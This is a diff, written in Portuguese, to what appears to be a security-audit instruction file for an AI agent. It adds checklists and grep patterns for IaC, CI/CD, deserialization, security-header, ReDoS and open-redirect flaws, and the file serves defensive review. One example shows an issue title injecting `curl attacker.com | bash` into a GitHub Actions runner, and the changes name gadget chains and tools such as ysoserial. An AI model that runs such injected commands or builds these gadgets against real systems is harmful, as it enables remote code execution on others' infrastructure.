@@ -206,14 +206,95 @@
     - **Cookies sem Flags de Segurança:**
       - `grep_search` por `Set-Cookie`. Verificar ausência de `HttpOnly` (protege de XSS), `Secure` (força HTTPS), `SameSite=Strict` (protege de CSRF).
 
----
+25. **Segurança de Infrastructure as Code (IaC) e Cloud:** *(Adicionado - automelhorar v2.1)*
+    - Arquivos de infraestrutura têm o mesmo peso que código de aplicação. Uma misconfiguração aqui compromete tudo acima dele.
+    - **Dockerfile:**
+      - `FROM` com imagem sem tag fixa (`FROM ubuntu:latest`) = supply chain risk.
+      - `USER root` no final do Dockerfile = container executa como root, amplia RCE.
+      - `ENV SECRET_KEY=valor_hardcoded` = segredo exposto em layer de imagem.
+      - `COPY . .` sem `.dockerignore` = código sensível, `.env`, `.git` dentro da imagem.
+    - **Docker Compose:**
+      - `privileged: true` = container com acesso total ao host.
+      - `volumes: /:/host` = acesso ao filesystem do host.
+      - `network_mode: host` = sem isolamento de rede.
+    - **Kubernetes YAML:**
+      - `securityContext.runAsRoot: true`, `privileged: true`, `allowPrivilegeEscalation: true`.
+      - `hostPID: true`, `hostNetwork: true` = fuga de namespace.
+      - Secrets em `env.value` em vez de `env.valueFrom.secretKeyRef`.
+    - **Terraform / CloudFormation:**
+      - IAM com `"Action": "*"`, `"Resource": "*"` = permissão total na conta AWS.
+      - S3 bucket com `acl: public-read` ou `public-read-write`.
+      - Security Group com `0.0.0.0/0` em portas administrativas (22, 3389, 5432).
+      - `sensitive = false` em outputs com dados críticos.
+    - **`grep_search`:** `privileged: true`, `runAsRoot`, `hostPID`, `Action.*\*`, `public-read`, `0.0.0.0/0`, `FROM.*latest`, `ENV.*PASSWORD`.
+
+26. **CI/CD Pipeline Attack Surface:** *(Adicionado - automelhorar v2.1)*
+    - Pipelines CI/CD executam código com access tokens e segredos de produção. Um ataque aqui é RCE direto na infraestrutura de deploy.
+    - **Script Injection em GitHub Actions:**
+      - Qualquer `${{ github.event.pull_request.title }}` ou `${{ github.head_ref }}` interpolado diretamente em `run:` é injectável por qualquer pessoa que abra um PR.
+      - Exemplo crítico: `run: echo "${{ github.event.issue.title }}"`—um título de issue com `` `curl attacker.com | bash` `` executa no runner.
+    - **Segredos Expostos em Logs:**
+      - `run: echo ${{ secrets.DATABASE_URL }}` imprime o segredo nos logs públicos.
+      - `grep_search` por `echo.*secrets`, `print.*env`, `console.log.*process.env`.
+    - **Dependency Confusion Attack:**
+      - Se o projeto usa packages de registry interno (Nexus, Artifactory) com nomes públicos no mesmo namespace, atacante publica versão de maior número no NPM/PyPI público e o installer prefere o público.
+      - Verificar: `package.json` sem escopo `@org/` ou sem `--registry` explicitado no pipeline.
+    - **Permissões Excessivas em Workflow:**
+      - `permissions: write-all` no topo do workflow = qualquer step pode modificar o repositório, criar releases, escrever packages.
+    - **`grep_search`:** `github.event.pull_request.title`, `github.event.issue`, `head_ref`, `write-all`, `echo.*secrets`, nos arquivos `.github/workflows/*.yml`.
+
+27. **Deserialização Insegura — Protocolo por Linguagem:** *(Adicionado - automelhorar v2.1)*
+    - Deserialização de dados não confiáveis é uma das poucas vulnerabilidades que garante RCE por design.
+    - **PHP — `unserialize()`:**
+      - Magic methods explorados: `__wakeup()` (chamado na deserialização), `__destruct()` (chamado ao destruir o objeto), `__toString()` (quando o objeto é convertido a string).
+      - O payload manipula a estrutura serializada para injetar uma classe com `__destruct` que executa `system()` ou `file_put_contents()`.
+      - `grep_search` por `unserialize(`, especialmente quando o argumento vem de `$_COOKIE`, `$_GET`, `$_POST`.
+    - **Java — `ObjectInputStream`:**
+      - Gadget chains via bibliotecas populares: `Commons Collections 3.1`, `Spring Framework`, `Groovy`, `JBoss`.
+      - O apelido da vuln é Java Deserialization. Ferramentas: ysoserial. Detecção estática: `grep_search` por `ObjectInputStream(`, `readObject(`, `readUnshared(`.
+    - **Python — `pickle.loads()`:**
+      - Qualquer objeto Python pode ser serializado. `__reduce__` define o que é executado na deserialização, permitindo execução arbitrária.
+      - `grep_search` por `pickle.loads(`, `pickle.load(`, `cPickle`, `shelve.open(`.
+    - **.NET — `BinaryFormatter` / `JavaScriptSerializer`:**
+      - `BinaryFormatter` foi oficialmente deprecado pela Microsoft por ser inseguro por design.
+      - `TypeConfuseDelegate` é o gadget principal usado em exploits .NET.
+      - `grep_search` por `BinaryFormatter`, `NetDataContractSerializer`, `SoapFormatter`.
+
+28. **HTTP Security Headers — Análise Sistemática:** *(Adicionado - automelhorar v2.1)*
+    - Headers ausentes não são vulnerabilidades diretas, mas amplificam sistematicamente o impacto de outros ataques.
+    - **Matriz de headers obrigatórios e impacto da ausência:**
+
+      | Header | Ausência Permite |
+      |---|---|
+      | `Content-Security-Policy` | XSS sem restrição, injecção de scripts externos |
+      | `Strict-Transport-Security` | Downgrade para HTTP, MitM |
+      | `X-Frame-Options: DENY` | Clickjacking, ui-redressing |
+      | `X-Content-Type-Options: nosniff` | MIME sniffing, XSS via arquivo upload |
+      | `Referrer-Policy` | Vaza tokens/paths sensíveis no header Referer |
+      | `Permissions-Policy` | Acesso indevido a câmera, microfone, geolocalização |
+
+    - **Protocolo:** `grep_search` por onde os headers são definidos (`app.use(helmet`, `res.setHeader`, `add_header` em nginx.conf). Ausência de `helmet()` em Express, por exemplo, é finding imediato.
+    - **Chain Exploit:** Ausência de CSP + XSS encontrado = reclassificar o XSS para severidade máxima da categoria.
+
+29. **ReDoS e Open Redirect — Vetores Sub-Reportados:** *(Adicionado - automelhorar v2.1)*
+    - **ReDoS (Regular Expression Denial of Service):**
+      - Certos padrões de regex com backtracking catastrofico (`(a+)+`, `([a-zA-Z]+)*`, `(a|aa)+`) travam o motor de regex com inputs controlados pelo atacante.
+      - Um input malicioso de 50 caracteres pode travar 100% de uma thread Node.js (single-threaded) por segundos — efetivo DoS.
+      - `grep_search` por: `new RegExp(userInput`, `RegExp(req.`, quantificadores aninhados em regex estáticas.
+      - Para confirmar: criar script efêmero Python em `.tmp/` usando `re` com o padrão e medir tempo de execução com input progressivamente maior.
+    - **Open Redirect:**
+      - Endpoint aceita um parâmetro de URL e redireciona para ele sem validação.
+      - `grep_search` por: `redirect(req.query`, `header("Location:", $_GET`, `res.redirect(req.query`, `window.location = searchParams`.
+      - **Sozinho:** Baixo impacto. **Em chain com OAuth/SAML:** o `redirect_uri` malicioso rouba o authorization code. **Em chain com SSRF:** o redirect contorna validação de IP.
+      - Reclassificar para Alto imediatamente se o sistema usa OAuth.
 
 ## Protocolo de Investigação Exploratória (PEI)
 
 ### Fase 0 — Avaliação de Stack e Heurística Probabilística
 - Identificar: linguagem, framework, bibliotecas (`composer.json`, `package.json`, `requirements.txt`, `pom.xml`, `web.config`).
+- **Se existirem arquivos IaC** (`.tf`, `docker-compose.yml`, `*.yaml` em `.github/workflows/`, `k8s/`): priorizar Pilares 25 e 26 imediatamente antes de qualquer código de aplicação.
 - Construir mentalmente o **Mapa de Probabilidades**: listar as 3 classes de vulnerabilidade mais prováveis dado o stack, na ordem de ataque.
-- **Sinais de alta probabilidade adicionais:** qualquer endpoint com parâmetro de filename/path → Path Traversal prioritário. Qualquer configuração CORS dinâmica → verificar imediatamente. Qualquer parsing de XML em app REST → XXE. App usa GraphQL → iniciar com introspection e batch aliases. App usa MongoDB/Firebase → verificar operadores `$` não sanitizados.
+- **Sinais de alta probabilidade adicionais:** qualquer endpoint com parâmetro de filename/path → Path Traversal. Qualquer configuração CORS dinâmica → verificar imediatamente. Qualquer parsing de XML → XXE. App usa GraphQL → introspection e batch aliases. App usa MongoDB/Firebase → operadores `$` não sanitizados. `unserialize/readObject/pickle.loads` → Pilares 27 imediato.
 
 ### Fase 0.5 — Análise de Dependências por CVE *(Adicionado - automelhorar v1.4)*
 - Ler os manifestos de dependência e cruzar versões com CVEs críticos conhecidos (ver Pilar 14).
@@ -224,7 +305,7 @@
 - Mapear: pontos de entrada (forms, APIs, params GET/POST), camada de banco (queries, ORMs), autenticação/autorização, uploads, inclusões de arquivo.
 
 ### Fase 2 — Identificação de Critical Sinks e Source-to-Sink Tracing
-- `grep_search` focado nos sinks mais perigosos: `exec`, `eval`, `system`, `include`, `query`, `innerHTML`, `dangerouslySetInnerHTML`, `deserialize`, `pickle.loads`, `yaml.load`, `find({`, `$where`, `fetch(url`, `graphql`, `md5(`, `sha1(`, `Math.random()`, `Set-Cookie`, `session_regenerate`.
+- `grep_search` focado nos sinks mais perigosos: `exec`, `eval`, `system`, `include`, `query`, `innerHTML`, `dangerouslySetInnerHTML`, `deserialize`, `pickle.loads`, `yaml.load`, `find({`, `$where`, `fetch(url`, `graphql`, `md5(`, `sha1(`, `Math.random()`, `Set-Cookie`, `session_regenerate`, `unserialize(`, `ObjectInputStream`, `BinaryFormatter`, `github.event.pull_request.title`, `privileged: true`, `redirect(req`.
 - Para cada sink encontrado, rastrear até a origem do dado. Validar se há sanitização real (*whitelist*) ou apenas filtros ilusórios (*blacklist*).
 
 ### Fase 3 — Análise de Lógica de Negócio e Fronteiras de Confiança
@@ -352,4 +433,5 @@ compromisso total — do primeiro contato até RCE ou exfiltração completa.
 | v1.4 | 15/04/2026 | Mass Assignment via ORM, Race Condition/TOCTOU, SSTI por Engine com payloads, JWT Algorithm Confusion completo, Análise de Dependências por CVE |
 | v1.5 | 15/04/2026 | XXE com payload e Content-Type switching, Prototype Pollution completo, CORS Misconfiguration com variantes, Path Traversal em file serving, Vazamento de Stack Trace como vetor de chain |
 | v1.6 | 15/04/2026 | GraphQL Attack Surface completo, NoSQL Injection, SSRF protocolo com bypasses, Análise Criptográfica Sistemática, Protocolo de Autenticação e Sessão |
-| v2.0 | 15/04/2026 | **UPGRADE TOTAL DE OUTPUT: Dual-Report (Executivo + Técnico), CVSS 3.1 por finding, Narrativa de Ataque Cinematográfica, Patch Contextual gerado no framework do alvo, PoC Script executável por finding, Matriz Risco×Esforço, Kill Chain Narrative de Comprometimento Total** |
+| v2.0 | 15/04/2026 | UPGRADE TOTAL DE OUTPUT: Dual-Report (Executivo + Técnico), CVSS 3.1, Narrativa de Ataque, Patch Contextual, PoC Script, Matriz Risco×Esforço, Kill Chain Narrative |
+| v2.1 | 15/04/2026 | **IaC/Cloud Security (Dockerfile, Docker Compose, K8s, Terraform), CI/CD Pipeline Attack Surface (GitHub Actions script injection, dependency confusion), Deserialização por Linguagem (PHP/Java/Python/.NET com gadgets), HTTP Security Headers Matriz, ReDoS + Open Redirect com chain OAuth** |
